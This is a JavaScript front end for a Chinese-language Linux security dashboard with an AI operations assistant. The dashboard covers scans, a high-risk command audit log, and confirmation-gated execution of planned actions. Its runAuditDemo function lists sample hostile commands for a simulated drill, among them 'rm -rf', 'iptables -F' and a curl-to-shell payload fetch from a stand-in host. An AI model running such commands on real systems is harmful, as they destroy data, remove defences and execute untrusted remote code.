"use strict";

const state = {
  overview: null,
  findings: [],
  scans: null,
  audit: [],
  rules: null,
  activeView: "overview",
  severityFilter: "all",
  auditFilter: "all",
  auditLastRun: null,
  riskFilter: "all",
  ruleQuery: "",
  plans: {},
  draftMessage: "",
  draftOverrides: {},
  confirming: null,
  scanTimer: null,
};

const VIEW_TITLES = {
  overview: "总览",
  assistant: "对话操作",
  vulnerabilities: "漏洞巡检",
  audit: "高危日志",
  rules: "规则库",
};

const SOURCE_LABELS = {
  auditd: "auditd",
  history: "命令历史",
  secure: "sudo 日志",
  agent: "Agent 操作",
  planner: "策略拦截",
  simulation: "模拟演练",
};

const $ = (selector, root = document) => root.querySelector(selector);
const $$ = (selector, root = document) => Array.from(root.querySelectorAll(selector));

function escapeHtml(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function containsCjk(value) {
  return /[\u3400-\u4dbf\u4e00-\u9fff\uf900-\ufaff]/.test(String(value || ""));
}

function planLanguage(plan) {
  return plan?.language === "en" ? "en" : "zh";
}

function localizedPick(language, zh, en) {
  return language === "en" ? en : zh;
}

function icon(name) {
  return `<svg class="icon" aria-hidden="true"><use href="#i-${name}"></use></svg>`;
}

function formatDate(timestamp, includeTime = true) {
  if (!timestamp) return "尚未运行";
  const date = new Date(timestamp * 1000);
  if (Number.isNaN(date.getTime())) return "未知";
  return date.toLocaleString("zh-CN", {
    month: "2-digit",
    day: "2-digit",
    hour: includeTime ? "2-digit" : undefined,
    minute: includeTime ? "2-digit" : undefined,
    hour12: false,
  });
}

function formatRelative(timestamp) {
  if (!timestamp) return "";
  const seconds = Math.max(0, Date.now() / 1000 - timestamp);
  if (seconds < 60) return "刚刚";
  if (seconds < 3600) return `${Math.floor(seconds / 60)} 分钟前`;
  if (seconds < 86400) return `${Math.floor(seconds / 3600)} 小时前`;
  return `${Math.floor(seconds / 86400)} 天前`;
}

async function api(path, options = {}) {
  const response = await fetch(path, {
    credentials: "same-origin",
    headers: {
      "Content-Type": "application/json",
      ...(options.headers || {}),
    },
    ...options,
  });
  let data = null;
  try {
    data = await response.json();
  } catch {
    data = {};
  }
  if (response.status === 401) {
    showLogin();
  }
  if (!response.ok) {
    throw new Error(data.error || `请求失败 (${response.status})`);
  }
  return data;
}

function toast(message, kind = "normal") {
  const element = $("#toast");
  element.textContent = message;
  element.className = `toast ${kind === "error" ? "error" : ""}`;
  window.clearTimeout(toast.timer);
  toast.timer = window.setTimeout(() => element.classList.add("hidden"), 3600);
}

function showLogin() {
  $("#login-screen").classList.remove("hidden");
  $("#app-shell").classList.add("hidden");
  window.setTimeout(() => $("#login-password")?.focus(), 50);
}

function showApp() {
  $("#login-screen").classList.add("hidden");
  $("#app-shell").classList.remove("hidden");
}

async function bootstrap() {
  updateClock();
  window.setInterval(updateClock, 1000);
  try {
    const auth = await api("/api/auth/status");
    $("#demo-hint").classList.toggle("hidden", !auth.demo);
    if (auth.authenticated) {
      showApp();
      const initialView = location.hash.replace("#", "");
      if (VIEW_TITLES[initialView]) setView(initialView);
      await loadAll();
    } else {
      showLogin();
    }
  } catch (error) {
    showLogin();
    console.error(error);
  }
}

function updateClock() {
  const now = new Date();
  $("#clock").textContent = now.toLocaleString("zh-CN", {
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  });
}

async function loadAll() {
  await Promise.allSettled([loadOverview(), loadFindings(), loadAudit(), loadRules()]);
}

async function loadOverview() {
  const data = await api("/api/overview");
  state.overview = data;
  renderOverview();
}

async function loadFindings() {
  const data = await api("/api/findings");
  state.findings = data.findings || [];
  state.scans = data.scan;
  renderFindings();
}

async function loadAudit() {
  const data = await api("/api/audit?limit=200");
  state.audit = data.events || [];
  state.auditLastRun = data.last_run;
  renderAudit();
}

async function loadRules() {
  const data = await api("/api/rules");
  state.rules = data;
  renderRules();
}

function setView(name) {
  if (!VIEW_TITLES[name]) return;
  state.activeView = name;
  $$(".nav-item").forEach((item) => item.classList.toggle("active", item.dataset.view === name));
  $$(".view").forEach((view) => view.classList.toggle("active", view.dataset.viewPanel === name));
  $("#page-title").textContent = VIEW_TITLES[name];
  history.replaceState(null, "", `#${name}`);
  $(".sidebar")?.classList.remove("open");
  document.querySelector(".a11y-backdrop")?.remove();
  window.scrollTo({ top: 0, behavior: "auto" });
  if (name === "vulnerabilities") loadFindings().catch(showError);
  if (name === "audit") loadAudit().catch(showError);
  if (name === "rules" && !state.rules) loadRules().catch(showError);
}

function showError(error) {
  toast(error.message || String(error), "error");
}

function renderOverview() {
  const data = state.overview;
  if (!data) return;
  const system = data.system || {};
  $("#system-name").textContent = `${system.hostname || "未知主机"} · ${system.os || ""}`;
  const modeChip = $("#mode-chip");
  modeChip.textContent = data.agent.mode === "demo" ? "演示数据" : "实时监测";
  modeChip.className = `chip ${data.agent.mode === "demo" ? "chip-demo" : "chip-neutral"}`;
  const nlu = data.agent.nlu || {};
  $("#agent-mode").textContent = data.agent.mode === "demo"
    ? "本地演示"
    : nlu.active ? `系统服务 · ${nlu.provider}` : "系统服务 · 规则模式";

  const summary = data.scan.summary;
  $("#risk-score").textContent = summary ? data.risk.score : "--";
  $("#risk-progress").value = summary ? data.risk.score : 0;
  $("#risk-caption").textContent = summary
    ? data.risk.score >= 85
      ? "整体风险较低"
      : data.risk.score >= 65
        ? "存在需要安排处理的风险"
        : "建议尽快处理高危项"
    : "尚未进行系统巡检";
  $("#high-findings").textContent = data.risk.high_findings;
  $("#finding-caption").textContent = summary
    ? `共发现 ${data.risk.findings} 个风险项`
    : "暂无巡检数据";
  $("#audit-total").textContent = data.audit.total;
  $("#audit-caption").textContent = data.audit.unacknowledged
    ? `${data.audit.unacknowledged} 条待确认`
    : "未发现待处理事件";
  $("#uptime").textContent = system.uptime || "--";
  $("#os-caption").textContent = system.kernel || "读取内核信息";

  const counts = summary || { critical: 0, high: 0, medium: 0, low: 0 };
  const maxCount = Math.max(1, counts.critical, counts.high, counts.medium, counts.low);
  for (const level of ["critical", "high", "medium", "low"]) {
    $(`#bar-${level}`).max = maxCount;
    $(`#bar-${level}`).value = counts[level] || 0;
    $(`#count-${level}`).textContent = counts[level] || 0;
  }
  $("#scan-time").textContent = data.scan.finished_at
    ? formatDate(data.scan.finished_at)
    : "尚未巡检";
  $("#scan-status").textContent =
    data.scan.status === "completed"
      ? `${data.scan.summary.checked} 项已完成`
      : data.scan.status === "running"
        ? "巡检进行中"
        : data.scan.status === "failed"
          ? "巡检失败"
          : "等待检查";
  $("#audit-badge").textContent = data.audit.unacknowledged;
  $("#audit-badge").classList.toggle("hidden", !data.audit.unacknowledged);
  renderRecentEvents(data.recent_events || []);
  renderQuickPrompts(data.templates || []);
}

function renderRecentEvents(events) {
  const root = $("#recent-events");
  if (!events.length) {
    root.innerHTML = '<div class="empty-inline">暂无高危命令记录</div>';
    return;
  }
  root.innerHTML = events.slice(0, 5).map((event) => `
    <div class="event-item">
      <span class="event-severity">${icon("alert")}</span>
      <div class="event-main">
        <strong>${escapeHtml(event.title_zh)}</strong>
        <code>${escapeHtml(event.command)}</code>
      </div>
      <span class="event-time">${formatRelative(event.detected_at)}</span>
    </div>
  `).join("");
}

function renderQuickPrompts(templates) {
  const root = $("#quick-prompts");
  root.innerHTML = templates.map((item) => `
    <button data-prompt="${escapeHtml(item.text)}">${escapeHtml(item.text)}</button>
  `).join("");
}

function renderFindings() {
  const counts = state.scans?.summary || { critical: 0, high: 0, medium: 0, low: 0 };
  const total = state.findings.length;
  $("#checks-total").textContent = state.scans?.summary?.checked || "30";
  $("#checks-found").textContent = total;
  $("#checks-high").textContent = (counts.critical || 0) + (counts.high || 0);
  $("#checks-time").textContent = state.scans?.finished_at
    ? formatDate(state.scans.finished_at)
    : "尚未运行";
  const filtered = state.findings.filter(
    (item) => state.severityFilter === "all" || item.severity === state.severityFilter
  );
  $("#finding-count").textContent = `${filtered.length} 个结果`;
  const root = $("#findings-list");
  if (!filtered.length) {
    const message = total
      ? "当前筛选条件下没有结果"
      : state.scans
        ? "本次巡检未发现匹配的风险项"
        : "点击“重新巡检”开始只读安全检查";
    root.innerHTML = `
      <div class="table-panel empty-state">
        ${icon("checks")}
        <h2>${escapeHtml(message)}</h2>
        <p>${state.scans ? "可以继续定期巡检以观察变化。" : "巡检不会修改系统配置。"}</p>
      </div>`;
    return;
  }
  root.innerHTML = filtered.map((finding) => {
    const level = severityLabel(finding.severity);
    return `
      <details class="finding">
        <summary>
          <span class="finding-severity ${escapeHtml(finding.severity)}"></span>
          <span class="finding-title">
            <strong>${escapeHtml(finding.title_zh)}</strong>
            <span>${escapeHtml(categoryLabel(finding.category))}</span>
          </span>
          <span class="finding-meta">
            <span class="severity-badge ${escapeHtml(finding.severity)}">${escapeHtml(level)}</span>
            ${icon("chevron")}
          </span>
        </summary>
        <div class="finding-body">
          <div>
            <h4>发现说明</h4>
            <p>${escapeHtml(finding.detail)}</p>
          </div>
          <div>
            <h4>建议处理</h4>
            <p>${escapeHtml(finding.remediation)}</p>
            ${finding.evidence ? `<p class="finding-evidence"><code>${escapeHtml(finding.evidence)}</code></p>` : ""}
          </div>
        </div>
      </details>`;
  }).join("");
}

function severityLabel(severity) {
  return { critical: "严重", high: "高危", medium: "中危", low: "低危" }[severity] || severity;
}

function categoryLabel(category) {
  return {
    access_control: "访问控制",
    firewall: "防火墙",
    ssh: "SSH",
    patch: "补丁管理",
    time: "时间同步",
    audit: "审计",
    logging: "日志",
    account: "账户安全",
    filesystem: "文件系统",
    crypto: "加密策略",
    kernel: "内核",
    network: "网络",
    service: "服务",
    device: "外设",
    integrity: "完整性",
  }[category] || category || "系统";
}

function renderAudit() {
  const counts = state.overview?.audit || {};
  $("#audit-critical").textContent = counts.critical || 0;
  $("#audit-high").textContent = counts.high || 0;
  $("#audit-medium").textContent = counts.medium || 0;
  $("#audit-unack").textContent = counts.unacknowledged || 0;
  $("#audit-collected").textContent = state.auditLastRun
    ? `最近采集 ${formatDate(state.auditLastRun)}`
    : "等待下一次采集";
  const events = state.audit.filter(
    (item) => state.auditFilter === "all" || item.severity === state.auditFilter
  );
  const tbody = $("#audit-table-body");
  const empty = $("#audit-empty");
  empty.classList.toggle("hidden", events.length > 0);
  tbody.innerHTML = events.map((event) => `
    <tr>
      <td>
        <div class="event-cell">
          <span class="finding-severity ${escapeHtml(event.severity)}"></span>
          <span><strong>${escapeHtml(event.title_zh)}</strong><span>${escapeHtml(event.username)}</span></span>
        </div>
      </td>
      <td class="command-cell"><code>${escapeHtml(event.command)}</code></td>
      <td><span class="source-tag ${event.source === "simulation" ? "simulation" : ""}">${escapeHtml(SOURCE_LABELS[event.source] || event.source)}</span></td>
      <td>${escapeHtml(formatDate(event.detected_at))}</td>
      <td>
        ${event.acknowledged
          ? '<span class="acknowledged">已确认</span>'
          : `<button class="ack-button" data-ack-id="${event.id}">确认</button>`}
      </td>
    </tr>
  `).join("");
}

function renderRules() {
  if (!state.rules) return;
  $("#rule-count").textContent = state.rules.count;
  $("#vuln-count").textContent = state.rules.vulnerability_checks;
  $("#audit-rule-count").textContent = state.rules.audit_patterns;
  const query = state.ruleQuery.trim().toLowerCase();
  const actions = state.rules.actions.filter((action) => {
    const matchesQuery =
      !query ||
      action.title_zh.toLowerCase().includes(query) ||
      action.title_en.toLowerCase().includes(query) ||
      action.summary_zh.toLowerCase().includes(query);
    const matchesRisk = state.riskFilter === "all" || action.risk === state.riskFilter;
    return matchesQuery && matchesRisk;
  });
  $("#rules-table-body").innerHTML = actions.map((action) => `
    <tr>
      <td><strong>${escapeHtml(action.title_zh)}</strong><br><span class="muted">${escapeHtml(action.title_en)}</span></td>
      <td>${escapeHtml(categoryLabel(action.category))}</td>
      <td><span class="risk-badge risk-${escapeHtml(action.risk)}">${escapeHtml(riskLabel(action.risk))}</span></td>
      <td>${escapeHtml(action.impact_zh || action.summary_zh)}</td>
      <td>${action.requires_restart ? '<span class="restart-cell">建议重启</span>' : "—"}</td>
    </tr>
  `).join("");
}

function riskLabel(risk, language = "zh") {
  const labels = language === "en"
    ? { safe: "Read-only", caution: "Caution", destructive: "High risk" }
    : { safe: "只读", caution: "谨慎", destructive: "高风险" };
  return labels[risk] || risk;
}

function appendChat(role, html) {
  const root = $("#chat-log");
  const row = document.createElement("div");
  row.className = `chat-row ${role}`;
  row.innerHTML = role === "user"
    ? `<div class="chat-bubble"><p>${escapeHtml(html)}</p></div>`
    : `<span class="chat-avatar">${icon("shield")}</span><div class="chat-bubble">${html}</div>`;
  root.appendChild(row);
  root.scrollTop = root.scrollHeight;
  return row;
}

function appendThinking(language) {
  const root = $("#chat-log");
  const row = document.createElement("div");
  row.className = "chat-row assistant thinking-row";
  row.id = "thinking-row";
  row.innerHTML = `
    <span class="chat-avatar">${icon("shield")}</span>
    <div class="chat-bubble">
      <span class="thinking-dots"><span></span><span></span><span></span></span>
      ${localizedPick(
        language,
        state.overview?.agent?.nlu?.active
          ? "正在理解意图并检查风险"
          : "正在匹配规则并检查风险",
        state.overview?.agent?.nlu?.active
          ? "Interpreting intent and checking risk"
          : "Matching rules and checking risk"
      )}
    </div>`;
  root.appendChild(row);
  root.scrollTop = root.scrollHeight;
}

function removeThinking() {
  $("#thinking-row")?.remove();
}

async function submitPrompt(message, overrides = {}, options = {}) {
  const text = String(message || "").trim();
  if (!text || $("#chat-send").disabled) return;
  if (!options.silentUser) appendChat("user", text);
  appendThinking(containsCjk(text) ? "zh" : "en");
  $("#chat-send").disabled = true;
  try {
    const data = await api("/api/plan", {
      method: "POST",
      body: JSON.stringify({ message: text, overrides }),
    });
    removeThinking();
    renderPlanResponse(text, data, overrides);
  } catch (error) {
    removeThinking();
    appendChat("assistant", `<p>${escapeHtml(error.message)}</p>`);
  } finally {
    $("#chat-send").disabled = false;
    $("#chat-input").focus();
  }
}

function renderPlanResponse(message, data, overrides) {
  const plan = data.plan;
  const language = planLanguage(plan);
  if (plan.status === "blocked") {
    appendChat("assistant", `
      <div class="blocked-panel">
        <div class="blocked-title">${icon("alert")} ${localizedPick(language, "已拦截高风险操作", "High-risk operation blocked")}</div>
        <p><strong>${escapeHtml(plan.blocked.title || plan.blocked.title_zh)}</strong></p>
        <p>${escapeHtml(plan.blocked.reason || plan.blocked.reason_zh)}</p>
        <p class="muted">${localizedPick(language, "没有执行任何命令。", "No command was executed.")}</p>
      </div>`);
    loadAudit().catch(() => {});
    return;
  }
  if (plan.status === "unsupported") {
    appendChat("assistant", `<p>${escapeHtml(plan.message)}</p>`);
    return;
  }
  if (plan.status === "chat") {
    const suggestions = (plan.suggestions || []).map((item) => `
      <button class="quick-chip" data-prompt="${escapeHtml(item)}">${escapeHtml(item)}</button>
    `).join("");
    appendChat("assistant", `
      <p>${escapeHtml(plan.message)}</p>
      ${suggestions ? `<div class="chat-suggestions">${suggestions}</div>` : ""}`);
    return;
  }
  if (plan.status === "needs_input") {
    state.draftMessage = message;
    state.draftOverrides = overrides;
    appendChat("assistant", renderNeedsInput(plan));
    return;
  }
  if (plan.status !== "ready") {
    appendChat("assistant", `<p>${escapeHtml(plan.message || "无法生成操作计划")}</p>`);
    return;
  }
  const planHtml = renderPlanCard(plan, data.proposal_id);
  state.plans[data.proposal_id] = { plan, proposalId: data.proposal_id };
  appendChat("assistant", planHtml);
}

function renderNeedsInput(plan) {
  const language = planLanguage(plan);
  const grouped = new Map();
  for (const field of plan.fields) {
    if (!grouped.has(field.action_id)) grouped.set(field.action_id, []);
    grouped.get(field.action_id).push(field);
  }
  const groups = Array.from(grouped.entries()).map(([, fields]) => `
    <div class="needs-action-label">${escapeHtml(fields[0].action_title)}</div>
    ${fields.map((field) => `
      <div class="needs-field">
        <label for="need-${escapeHtml(field.action_id)}-${escapeHtml(field.name)}">${escapeHtml(field.label || field.label_zh)}</label>
        <input id="need-${escapeHtml(field.action_id)}-${escapeHtml(field.name)}"
          data-action-id="${escapeHtml(field.action_id)}"
          data-param="${escapeHtml(field.name)}"
          value="${escapeHtml(field.value || "")}"
          placeholder="${escapeHtml(field.placeholder || "")}">
      </div>
    `).join("")}
  `).join("");
  return `
    <p>${escapeHtml(plan.message)}</p>
    <form class="needs-form" id="needs-form">
      ${groups}
      <div class="plan-actions">
        <button type="submit" class="btn btn-primary">${icon("chevron")}${localizedPick(language, "继续生成计划", "Generate plan")}</button>
      </div>
    </form>`;
}

function renderPlanCard(plan, proposalId) {
  const language = planLanguage(plan);
  const warnings = (plan.warnings || []).map((warning) => `
    <div class="plan-warning">
      ${icon("alert")}
      <div>
        <strong>${escapeHtml(warning.title || warning.title_zh)}</strong>
        <p>${escapeHtml(warning.context || warning.context_zh || warning.body || warning.body_zh)}</p>
      </div>
    </div>`).join("");
  const steps = plan.steps.map((step, index) => `
    <label class="plan-step">
      <input type="checkbox" class="action-check" value="${escapeHtml(step.action_id)}" checked>
      <span class="step-number">${index + 1}</span>
      <span class="step-main">
        <span class="step-title-line">
          <strong>${escapeHtml(step.title || step.title_zh)}</strong>
          <span class="risk-badge risk-${escapeHtml(step.risk)}">${escapeHtml(riskLabel(step.risk, language))}</span>
        </span>
        <p>${escapeHtml(step.summary || step.summary_zh)}</p>
        ${step.command_previews.map((command) => `<code class="command-preview">${escapeHtml(command)}</code>`).join("")}
        ${step.requires_restart ? `<span class="restart-callout">${icon("power")}<span>${escapeHtml(step.restart_reason || step.restart_reason_zh || localizedPick(language, "完成后建议重启系统。", "A restart is recommended after this change."))}</span></span>` : ""}
      </span>
    </label>
  `).join("");
  return `
    <div class="plan-wrap" data-proposal-id="${escapeHtml(proposalId)}">
      <div class="plan-header">
        <div>
          <h3>${language === "en"
            ? `${plan.steps.length} operation step${plan.steps.length === 1 ? "" : "s"}`
            : plan.steps.length > 1 ? `${plan.steps.length} 个操作步骤` : "操作计划"}</h3>
          <p>${escapeHtml(plan.message)}</p>
          ${plan.planner === "llm" ? `<span class="plan-source">${icon("checks")}${localizedPick(language, "LLM 理解 + 本地安全校验", "LLM interpretation + local safety validation")} · ${escapeHtml(plan.llm_model || "")}</span>` : ""}
        </div>
        <span class="risk-badge risk-${escapeHtml(plan.overall_risk)}">${escapeHtml(plan.overall_risk_label)}</span>
      </div>
      ${warnings}
      <div class="plan-steps">${steps}</div>
      ${plan.requires_restart ? `<div class="restart-callout">${icon("power")}<span>${localizedPick(language, "计划中有变更需要重启或重新登录后完全生效。", "A restart or re-login is required for some changes to take effect.")}</span></div>` : ""}
      <div class="plan-actions">
        <span class="plan-note">${plan.requires_confirmation ? `${localizedPick(language, "确认语", "Confirmation phrase")}：${escapeHtml(plan.confirmation_phrase)}` : localizedPick(language, "只读操作不会修改系统", "Read-only operations do not modify the system")}</span>
        <button class="btn btn-primary execute-plan-btn">${plan.requires_confirmation ? localizedPick(language, "审核并执行", "Review and execute") : localizedPick(language, "执行只读操作", "Run read-only checks")}</button>
      </div>
    </div>`;
}

function openConfirm(plan, proposalId, selectedActionIds) {
  const language = planLanguage(plan);
  const selectedSteps = plan.steps.filter((step) => selectedActionIds.includes(step.action_id));
  const nonSafe = selectedSteps.filter((step) => step.risk !== "safe");
  const selectedRisk = nonSafe.some((step) => step.risk === "destructive")
    ? "destructive"
    : nonSafe.length
      ? "caution"
      : "safe";
  const expected = nonSafe.length === 0
    ? ""
    : nonSafe.length === 1
      ? nonSafe[0].confirmation_phrase || "确认执行"
      : selectedRisk === "destructive"
        ? localizedPick(language, "确认执行高风险操作", "Confirm high-risk operations")
        : localizedPick(language, "确认执行以上操作", "Confirm selected operations");
  state.confirming = { plan, proposalId, selectedActionIds, expected };
  $("#confirm-title").textContent = nonSafe.length
    ? localizedPick(language, "确认执行变更", "Confirm system changes")
    : localizedPick(language, "执行只读操作", "Run read-only checks");
  $("#confirm-subtitle").textContent = nonSafe.length
    ? localizedPick(language, "核对影响范围，输入确认语后才能继续", "Review the impact and enter the confirmation phrase to continue")
    : localizedPick(language, "将读取系统信息，不会修改配置", "System information will be read without changing configuration");
  $("#confirm-icon").className = `modal-icon ${nonSafe.length ? "" : "safe"}`;
  const warnings = (plan.warnings || []).map((item) => `<p><strong>${escapeHtml(item.title || item.title_zh)}</strong> ${escapeHtml(item.context || item.context_zh || item.body || item.body_zh)}</p>`).join("");
  $("#confirm-body").innerHTML = `
    <p>${escapeHtml(plan.steps.filter((step) => selectedActionIds.includes(step.action_id)).map((step) => step.title || step.title_zh).join(language === "en" ? ", " : "、"))}</p>
    ${warnings}
    <p class="muted">${selectedSteps.some((step) => step.requires_restart)
      ? localizedPick(language, "完成后可能需要重启。", "A restart may be required afterward.")
      : localizedPick(language, "执行结果会写入审计记录。", "Execution results will be written to the audit log.")}</p>`;
  $("#confirm-phrase-wrap").classList.toggle("hidden", !expected);
  $("#confirm-phrase-hint").textContent = expected
    ? localizedPick(language, `请输入：${expected}`, `Enter: ${expected}`)
    : "";
  $("#confirm-phrase").value = "";
  $("#confirm-submit").disabled = Boolean(expected);
  $("#confirm-submit").textContent = nonSafe.length
    ? localizedPick(language, "确认执行", "Confirm execution")
    : localizedPick(language, "继续执行", "Continue");
  $("#confirm-modal").classList.remove("hidden");
  if (expected) $("#confirm-phrase").focus();
  else $("#confirm-submit").focus();
}

function closeConfirm() {
  $("#confirm-modal").classList.add("hidden");
  state.confirming = null;
}

async function executeConfirmed() {
  const current = state.confirming;
  if (!current) return;
  const inputValue = $("#confirm-phrase").value.trim();
  if (current.expected && inputValue !== current.expected) {
    toast(localizedPick(planLanguage(current.plan), "确认语不正确", "Incorrect confirmation phrase"), "error");
    return;
  }
  $("#confirm-submit").disabled = true;
  try {
    const data = await api("/api/execute", {
      method: "POST",
      body: JSON.stringify({
        proposal_id: current.proposalId,
        selected_action_ids: current.selectedActionIds,
        confirmation: inputValue,
      }),
    });
    closeConfirm();
    appendExecutionResult(data.result);
    await loadAll();
  } catch (error) {
    toast(error.message, "error");
    $("#confirm-submit").disabled = false;
  }
}

function appendExecutionResult(result) {
  const language = result.language === "en" ? "en" : "zh";
  const blocks = result.steps.map((step) => {
    const commands = step.commands.map((command) => `
      <code class="command-preview">${escapeHtml(command.command)}</code>
      ${command.output ? `<pre class="command-output">${escapeHtml(command.output)}</pre>` : ""}
    `).join("");
    return `
      <div class="execution-step">
        <div class="step-title-line">
          <strong>${escapeHtml(step.title || step.title_zh)}</strong>
          <span class="severity-badge ${step.ok ? "low" : "high"}">${step.ok
            ? localizedPick(language, "已完成", "Completed")
            : localizedPick(language, "失败", "Failed")}</span>
        </div>
        ${commands}
      </div>`;
  }).join("");
  const restart = result.requires_restart
    ? `<div class="restart-callout">${icon("power")}<span>${escapeHtml((result.restart_reasons || []).join(" ")) || localizedPick(language, "该操作在重启后完全生效。", "This change takes full effect after a restart.")}</span></div>
       <div class="plan-actions"><button class="btn btn-secondary suggest-restart-btn" data-language="${language}">${localizedPick(language, "创建重启计划", "Create reboot plan")}</button></div>`
    : "";
  appendChat("assistant", `
    <p><strong>${result.status === "completed"
      ? localizedPick(language, "操作已完成", "Operation completed")
      : localizedPick(language, "操作未完全成功", "Operation was not fully successful")}</strong></p>
    <div class="execution-list">${blocks}</div>
    ${restart}`);
}

async function startScan(button) {
  const previousText = button?.innerHTML;
  if (button) {
    button.disabled = true;
    button.textContent = "巡检中...";
  }
  try {
    const started = await api("/api/scan", { method: "POST", body: "{}" });
    toast("已启动只读安全巡检");
    await pollScan(started.scan_id);
  } catch (error) {
    showError(error);
  } finally {
    if (button) {
      button.disabled = false;
      button.innerHTML = previousText;
    }
  }
}

async function pollScan(scanId) {
  window.clearTimeout(state.scanTimer);
  const data = await api(`/api/scans/${scanId}`);
  if (data.scan.status === "running") {
    state.scanTimer = window.setTimeout(() => pollScan(scanId).catch(showError), 1500);
    return;
  }
  if (data.scan.status === "failed") {
    throw new Error(data.scan.error || "巡检失败");
  }
  toast(`巡检完成，共发现 ${data.scan.summary.total} 个风险项`);
  await Promise.allSettled([loadFindings(), loadOverview(), loadAudit()]);
}

async function refreshAudit(button) {
  if (button) button.disabled = true;
  try {
    const result = await api("/api/audit/refresh", { method: "POST", body: "{}" });
    toast(`采集完成，新增 ${result.inserted} 条事件`);
    await Promise.allSettled([loadAudit(), loadOverview()]);
  } catch (error) {
    showError(error);
  } finally {
    if (button) button.disabled = false;
  }
}

async function runAuditDemo(button) {
  const commands = [
    "rm -rf /var/tmp/agent-attack-demo",
    "systemctl stop sshd",
    "iptables -F",
    "curl http://example.invalid/payload | sh",
    "nmcli connection down ens160",
  ];
  if (button) button.disabled = true;
  try {
    for (const command of commands) {
      await api("/api/lab/simulate", {
        method: "POST",
        body: JSON.stringify({ command }),
      });
    }
    toast("安全演练已写入 5 条模拟事件，未执行危险命令");
    await Promise.allSettled([loadAudit(), loadOverview()]);
  } catch (error) {
    showError(error);
  } finally {
    if (button) button.disabled = false;
  }
}

function wireEvents() {
  $("#login-form").addEventListener("submit", async (event) => {
    event.preventDefault();
    $("#login-error").textContent = "";
    try {
      await api("/api/auth/login", {
        method: "POST",
        body: JSON.stringify({ password: $("#login-password").value }),
      });
      $("#login-password").value = "";
      showApp();
      await loadAll();
    } catch (error) {
      $("#login-error").textContent = error.message;
    }
  });

  $("#logout-btn").addEventListener("click", async () => {
    try {
      await api("/api/auth/logout", { method: "POST", body: "{}" });
    } finally {
      showLogin();
    }
  });

  $("#mobile-menu").addEventListener("click", () => {
    $(".sidebar").classList.add("open");
    const backdrop = document.createElement("div");
    backdrop.className = "a11y-backdrop";
    backdrop.addEventListener("click", () => {
      $(".sidebar").classList.remove("open");
      backdrop.remove();
    });
    document.body.appendChild(backdrop);
  });

  document.addEventListener("click", (event) => {
    const nav = event.target.closest(".nav-item");
    if (nav) {
      setView(nav.dataset.view);
      return;
    }
    const goView = event.target.closest("[data-go-view]");
    if (goView) {
      setView(goView.dataset.goView);
      return;
    }
    const prompt = event.target.closest("[data-prompt]");
    if (prompt) {
      setView("assistant");
      submitPrompt(prompt.dataset.prompt);
      return;
    }
    const execute = event.target.closest(".execute-plan-btn");
    if (execute) {
      const card = execute.closest(".plan-wrap");
      const proposalId = card.dataset.proposalId;
      const storedPlan = state.plans[proposalId];
      if (!storedPlan) {
        toast("操作计划已失效，请重新生成", "error");
        return;
      }
      const selected = $$(".action-check", card).filter((input) => input.checked).map((input) => input.value);
      if (!selected.length) {
        toast("请至少选择一个操作步骤", "error");
        return;
      }
      openConfirm(storedPlan.plan, proposalId, selected);
      return;
    }
    const restart = event.target.closest(".suggest-restart-btn");
    if (restart) {
      submitPrompt(restart.dataset.language === "en" ? "reboot" : "重启系统");
    }
  });

  $("#chat-form").addEventListener("submit", (event) => {
    event.preventDefault();
    const message = $("#chat-input").value.trim();
    if (!message) return;
    $("#chat-input").value = "";
    submitPrompt(message);
  });

  $("#chat-input").addEventListener("keydown", (event) => {
    if (event.key === "Enter" && !event.shiftKey) {
      event.preventDefault();
      $("#chat-form").requestSubmit();
    }
  });

  document.addEventListener("submit", (event) => {
    if (event.target.id !== "needs-form") return;
    event.preventDefault();
    const overrides = JSON.parse(JSON.stringify(state.draftOverrides || {}));
    $$("input[data-action-id]", event.target).forEach((input) => {
      const actionId = input.dataset.actionId;
      overrides[actionId] = overrides[actionId] || {};
      overrides[actionId][input.dataset.param] = input.value.trim();
    });
    submitPrompt(state.draftMessage, overrides, { silentUser: true });
  });

  $("#scan-top-btn").addEventListener("click", (event) => startScan(event.currentTarget));
  $("#scan-page-btn").addEventListener("click", (event) => startScan(event.currentTarget));
  $("#audit-refresh-btn").addEventListener("click", (event) => refreshAudit(event.currentTarget));
  $("#audit-demo-btn").addEventListener("click", (event) => runAuditDemo(event.currentTarget));

  $("#severity-filters").addEventListener("click", (event) => {
    const button = event.target.closest("[data-severity]");
    if (!button) return;
    state.severityFilter = button.dataset.severity;
    $$("button", $("#severity-filters")).forEach((item) => item.classList.toggle("active", item === button));
    renderFindings();
  });

  $("#audit-filters").addEventListener("click", (event) => {
    const button = event.target.closest("[data-audit-severity]");
    if (!button) return;
    state.auditFilter = button.dataset.auditSeverity;
    $$("button", $("#audit-filters")).forEach((item) => item.classList.toggle("active", item === button));
    renderAudit();
  });

  $("#risk-filters").addEventListener("click", (event) => {
    const button = event.target.closest("[data-risk]");
    if (!button) return;
    state.riskFilter = button.dataset.risk;
    $$("button", $("#risk-filters")).forEach((item) => item.classList.toggle("active", item === button));
    renderRules();
  });

  $("#rule-search").addEventListener("input", (event) => {
    state.ruleQuery = event.target.value;
    renderRules();
  });

  $("#audit-table-body").addEventListener("click", async (event) => {
    const button = event.target.closest("[data-ack-id]");
    if (!button) return;
    button.disabled = true;
    try {
      await api(`/api/audit/${button.dataset.ackId}/ack`, { method: "POST", body: "{}" });
      await Promise.allSettled([loadAudit(), loadOverview()]);
    } catch (error) {
      showError(error);
      button.disabled = false;
    }
  });

  $("#confirm-close").addEventListener("click", closeConfirm);
  $("#confirm-cancel").addEventListener("click", closeConfirm);
  $("#confirm-modal").addEventListener("click", (event) => {
    if (event.target === $("#confirm-modal")) closeConfirm();
  });
  $("#confirm-phrase").addEventListener("input", (event) => {
    const expected = state.confirming?.expected || "";
    $("#confirm-submit").disabled = event.target.value.trim() !== expected;
  });
  $("#confirm-submit").addEventListener("click", executeConfirmed);

  document.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && !$("#confirm-modal").classList.contains("hidden")) {
      closeConfirm();
    }
  });
}

wireEvents();
bootstrap();
